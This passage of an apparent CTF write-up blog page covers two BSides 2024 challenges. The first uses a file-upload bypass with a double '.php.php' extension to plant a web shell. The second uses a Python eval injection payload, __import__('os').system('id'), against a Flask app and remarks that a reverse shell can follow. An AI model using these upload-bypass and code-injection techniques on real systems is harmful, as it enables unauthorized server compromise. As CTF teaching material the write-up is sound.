+</span></span><span class="line"><span class="cl">    parser.add_argument(&#34;file&#34;, help=&#34;Path to the file to modify.&#34;)
+</span></span><span class="line"><span class="cl">    parser.add_argument(&#34;hex&#34;, help=&#34;Hex string to add.&#34;)
+</span></span><span class="line"><span class="cl">    parser.add_argument(&#34;position&#34;, help=&#34;Position to add hex data (&#39;start&#39;, &#39;end&#39;, or an integer for a custom offset).&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    args = parser.parse_args()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    if not os.path.isfile(args.file):
+</span></span><span class="line"><span class="cl">        print(&#34;File not found.&#34;)
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        add_hex_to_file(args.file, args.hex, args.position)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/bsides2024/upload.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="upload"
+	
+	
+></p>
+<p>Uploading the file we still get nothing.</p>
+<p>There is still one more step&hellip;.</p>
+<p>Uploading the file the file-extension is stripped and if you know a php web server , it will not parse anything anyfile that doesnt have the &ldquo;.php&rdquo; file extension.</p>
+<p>THe trick for this id to use two extension so that it strips one and leaves the other like &ldquo;shell.php.php&rdquo;</p>
+<p><img src="/images/bsides2024/shell.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="shell"
+	
+	
+></p>
+<p>We get a shell and read the /flag.txt</p>
+<p>flag{7512a04d-5acd-45d9-b7ba-89467f2ba4ec}</p>
+<hr>
+<h3 id="faceoff">Faceoff
+</h3><p>In this challenge we are given a login page, username and password are admin:admin123 , my team mate got these from wherever.</p>
+<p><img src="/images/bsides2024/black.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="df"
+	
+	
+></p>
+<p>I solved this challenge ten minutes to time so i might not explain properly how i did this.</p>
+<p>Afyer loggin in with the creds we are provided with a blackpage. Looking at the backend we can see that it uses flask . TIP: if you ever see flask in the backend most probably there is SSTI. So you have to look for user controlled input that is being diplayed in the page.</p>
+<p>There was a hint for the chal , so i used the word bsides as a parameter</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">3.88</span><span class="o">.</span><span class="mf">113.117</span><span class="o">/</span><span class="n">do_something</span><span class="err">?</span><span class="n">bsides</span><span class="o">=&lt;</span><span class="n">here</span> <span class="n">goes</span> <span class="n">your</span> <span class="n">payload</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Trying ssti payloads will give this error</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">You have said: Error: unhashable type: &#39;set
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I googled it and saw it was caused by python eval. So we can get code execution by using the payload below</p>
+<p><img src="/images/bsides2024/eval.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="eval"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://3.88.113.117/do_something?bsides=__import__(&#39;os&#39;).system(&#39;id&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Slap a reverse shell  and you are good to go.</p>
+<p>The flag wa hidden in &ldquo;do_something/secret&rdquo; , this i learnt after reading app.py file. Was lucky to get this 2 minutes before time</p>
+<p>flag: D0nt_4get_to_wear_Y0r_reflective_j4ck37s</p>
+<p><img src="/images/bsides2024/secret.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="flag"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo="f0rk3b0mb/f0rk3b0mb.github.io"
+    data-repo-id="R_kgDOJkJRlQ"
+    data-category="General"
+    data-category-id="DIC_kwDOJkJRlc4CbrS7"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="1"
+    data-lang="en"
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('1');
+            } else {
+                setGiscusTheme('dark_dimmed');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2023 - 
+        
+        2024 f0rk3b0mb
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
